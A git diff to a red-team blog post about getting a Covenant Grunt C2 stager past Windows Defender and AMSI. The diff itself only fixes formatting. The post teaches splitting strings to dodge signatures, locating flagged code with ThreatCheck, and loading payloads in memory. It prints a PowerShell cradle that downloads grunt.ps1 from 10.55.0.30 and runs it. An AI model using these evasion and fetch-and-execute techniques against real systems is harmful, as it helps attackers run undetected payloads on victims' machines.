@@ -65,7 +65,7 @@ Having that code in our VisualStudio we can highlight the string we want to repl
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/stager_rename.png "rename)  Grunt stager picture here
 
-What we can also do is concatenating strings instead if replacing them. So that ```GruntStager```becomes ```'Gru'+'ntS'+'ta'+'ger'```.  
+What we can also do is concatenating strings instead if replacing them. So that ```GruntStager``` becomes ```'Gru'+'ntS'+'ta'+'ger'```.  
 In several cases this is enough to fool AV.  
 
 A usefull tool that comes in handy when you want to test your new code against Windows Defender or AMSI is [Raste Mouse´s][ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It will basically split you code into chunks of specific length and test it against the database of Windows Defender or AMSI, and tell you where in your code it gets flagged.
@@ -88,7 +88,9 @@ By now you should know what to do :) Obfuscate the wrappers.
 
 Another approach is to try to not touch the disk with our malicious content, so that traditional AV is not able to catch us when reading from or writing to disk.  
 The most well known technique to me is to use PowerShell´s Invoke Expression feature. It will allow you to download a script from a remote source and execute it in memory.  
-```iex(new-object net.webclient).downloadstring('http://10.55.0.30/grunt.ps1')```  
+```
+iex(new-object net.webclient).downloadstring('http://10.55.0.30/grunt.ps1')
+```  
 
 Another possibility is to use [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) from - *who would have thought it* - S3cur3Th1sSh1t.  
 Okay so let´s bypass Defender by not touching the disc and put our default Grunt payload directly into memory:
